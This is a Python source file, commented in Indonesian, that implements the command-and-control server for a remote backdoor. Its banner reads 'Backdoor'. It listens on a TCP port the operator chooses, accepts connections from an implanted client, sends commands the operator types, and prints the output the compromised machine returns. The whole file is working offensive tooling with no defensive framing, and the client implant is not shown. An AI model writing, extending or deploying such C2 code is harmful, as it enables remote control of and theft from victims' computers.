import socket

# Fungsi utama untuk memulai server C2 (Command and Control)
def start_c2_server():

    # Menampilkan banner ASCII art sebagai identitas server C2
    print("""
    
  ____             _       _                  
 |  _ \           | |     | |                 
 | |_) | __ _  ___| | ____| | ___   ___  _ __ 
 |  _ < / _` |/ __| |/ / _` |/ _ \ / _ \| '__|
 | |_) | (_| | (__|   < (_| | (_) | (_) | |   
 |____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|   
                                              
                        
""")

    # Meminta pengguna untuk memasukkan alamat IP tempat server akan mendengarkan
    host = input("Masukkan alamat IP untuk mendengarkan: ")
    # Meminta pengguna untuk memasukkan port yang akan digunakan
    port = int(input("Masukkan port untuk mendengarkan: "))

    # Membuat socket menggunakan IPv4 (AF_INET) dan protokol TCP (SOCK_STREAM)
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Mengikat socket ke alamat IP dan port yang dimasukkan
    server_socket.bind((host, port))
    # Server akan mulai mendengarkan koneksi masuk, maksimal antrean 5 koneksi
    server_socket.listen(5)

    print("[+] Menunggu koneksi masuk...")

    # Loop utama server untuk menerima dan memproses koneksi klien
    while True:
        # Menerima koneksi dari klien
        client_socket, addr = server_socket.accept()
        print(f"[+] Koneksi diterima dari {addr[0]}:{addr[1]}")

        # Meminta pengguna memasukkan perintah yang akan dikirim ke backdoor
        command = input("Masukkan perintah untuk dikirim: ")
        # Mengirimkan perintah ke klien (backdoor) dalam format byte
        client_socket.send(command.encode())

        # Variabel untuk menampung output dari backdoor
        output = b""
        # Loop untuk menerima data dari klien (backdoor)
        while True:
            # Menerima data dari klien dengan ukuran buffer 4096 byte
            data = client_socket.recv(4096)
            if not data:  # Jika tidak ada data lagi yang diterima, keluar dari loop
                break
            output += data  # Menambahkan data ke variabel output

        print("[+] Output biner dari backdoor:")
        # Mencoba untuk menampilkan output dalam format teks UTF-8
        try:
            print(output.decode())  # Mencoba decoding output menjadi string UTF-8
        except UnicodeDecodeError:
            # Jika decoding gagal, menampilkan output biner asli
            print("[+] Output tidak dalam format UTF-8:")
            print(output)

        # Menutup koneksi dengan klien
        client_socket.close()

# Menjalankan fungsi utama jika skrip ini dieksekusi secara langsung
if __name__ == "__main__":
    start_c2_server()
